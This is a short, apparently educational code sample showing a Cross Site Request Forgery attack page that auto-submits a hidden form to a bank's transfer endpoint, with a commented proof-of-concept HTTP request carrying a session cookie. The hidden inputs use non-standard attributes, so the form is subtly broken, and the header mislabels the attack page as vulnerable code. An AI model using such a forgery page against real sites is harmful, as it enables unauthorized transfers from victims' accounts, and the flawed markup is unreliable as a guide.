//Cross Site Request Forgery (CSRF)

//Attention! vulnerable to CSRF code. Do not use it

<html>
  <body>
    <form action="https://saturnbank.com/transfer" method="POST">
      <input type="hidden" bsb="421314" accountNo="1736123125" amount="100" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>

/*POC:
POST /transfer HTTP/1.1
Host: saturnbank.com
Content-Length: 42
Content-Type: application/x-www-form-urlencoded
Cookie: session=OM19vamvikL4yvPQfTqrcjW2ItpDAkDm
bsb=421314&accountNo=1736123125&amount=100
*/
